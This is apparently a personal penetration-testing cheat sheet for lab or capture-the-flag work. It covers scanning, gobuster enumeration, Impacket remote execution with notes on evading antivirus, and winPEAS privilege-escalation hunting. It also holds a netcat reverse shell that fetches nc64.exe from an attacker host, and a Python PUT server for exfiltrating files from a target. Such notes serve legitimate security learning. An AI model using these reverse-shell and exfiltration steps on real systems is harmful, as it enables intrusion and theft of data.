
Connect to openvpn
`sudo Openvpn <file.ovpn>`


Nmap
`nmap -sT -sV -p- <ip> --min-rate=2000`


Network Models
- OSI Model (7 layers)
Application
Presentation
Session
Transport
Network
Datalink
Physical

- TCP/IP Model (4 layers)
Application layer (A+P+S)
Transport layer
Internet Layer
Network Access layer (D+P)

Common systems
-> application layer (wat services r run with)
HTTP, SMTP, Telnet, FTP, DNS, RIP, SNMP

-> Transport layer (whr services are run on)
TCP, UDP

-> Internet layer (stuff u see on the wire)
IP, ARP, ICMP, IGMP

-> Network access layer (physical stuff mostly)
Ethernet, USB, ATM, PPP

Some common ports
![[portscommon.png]]

# Tools
## gobuster
dir crawling
`gobuster dir -x .php -u http://<ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`

DNS subdomain bruteforceing
-> DNS resolves the subdomains
`gobuster dns -d erev0s.com -w awesome_wordlist.txt -i`

Using custom DNS server (eg if provided by the challenge)
`gobuster dns -d erev0s.com -w awesome_wordlist.txt -i -r <DNS ip>`

VHOST brute force
-> similar to DNS mode but checks by visiting the formed url and verifying the ip
-> if smt like cloudflare is used, could mess this way of checking as they open wierd stuff which seems like valid url but leads nowhr (status: 503) which is origin DNS error
`gobuster vhost -u erev0s.com -w awesome_wordlist.txt`


## Impacket
-> bunch of usefule python scripts 
-> cp the needed script into ur dir then just python3 exec it

`python impacket-mssqlclient -windows-auth <domain>/<username>:<password>@<ipaddr>`

`impacket-psexec` 
-> AV detected easilty

`impacket-wmiexec` or `impacket-smbexec`
-> could evade AV

eg
`python impacket-mssqlclient -windows-auth WINDOWS01/john:johntitor@192.56.0.1`

# simple netcat revshell

Upload the nc64.exe onto target and exec
`sudo python3 -m http 80`
`sudo nc -lvnp 1234`

target
`wget http://<attackerip>/nc64.exe`
`.\nc64.exe -e cmd.exe <attackerip> 1234` 
`-e /bin/bash` for linux


# PEAS

upload winPEAS64.exe onto the target using same technique as before 
`.\winPEASx64.exe`

-> find a vuln to use

In this case:
ConsoleHost_history.txt has frequently executed pwrshell cmds
`C:\Users\sq_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`

-> contained system commands allowing PE

Note: Similar for .bash_history for linux

# Firewall detection
![[hacks_7.jpg|1000]]

# DNS and on the wire
![[hacks_6.jpg|1000]]
# Python File Exfiltration (PUT)
-> pull a file from the target to your local python server
-> to unzip file etc

![[hacks_1.jpg|1000]]
Python2
```python
import SimpleHTTPServer

import BaseHTTPServer

class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

def do_PUT(self):

print self.headers

length = int(self.headers["Content-Length"])

path = self.translate_path(self.path)

with open(path, "wb") as dst:

dst.write(self.rfile.read(length))

if __name__ == '__main__':

SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
```
`python -m SimpleHTTPPUTServer.py`

Python3
use `http.server` and edit accordingly
```python
import argparse
import http.server
import os

class HTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
	def do_PUT(self):
		path = self.translate_path(self.path)
		if path.endswith('/'):
			self.send_response(405, "Method Not Allowed")
			self.wfile.write("PUT not allowed on a directory\n".encode())
			return
		else:
			try:
				os.makedirs(os.path.dirname(path))			
			except FileExistsError: pass			
			length = int(self.headers['Content-Length'])			
			with open(path, 'wb') as f:			
				f.write(self.rfile.read(length))		
			self.send_response(201, "Created")

if __name__ == '__main__':
	parser = argparse.ArgumentParser()	
	parser.add_argument('--bind', '-b', default='0.0.0.0', metavar='ADDRESS',	
						help='Specify alternate bind address '	
						'[default: all interfaces]')	
	parser.add_argument('port', action='store',	
						default=8000, type=int,	
						nargs='?',	
						help='Specify alternate port [default: 8000]')	
	args = parser.parse_args()
	
	http.server.test(HandlerClass=HTTPRequestHandler, port=args.port, bind=args.bind)
```
`python3 serv.py`


# HTTP basics
![[hacks_2.jpg|1000]]
![[hacks_3.jpg|1000]]


# Pentester lifecycle

![[hacks_4.jpg|1000]]

![[hacks_5.jpg|1000]]



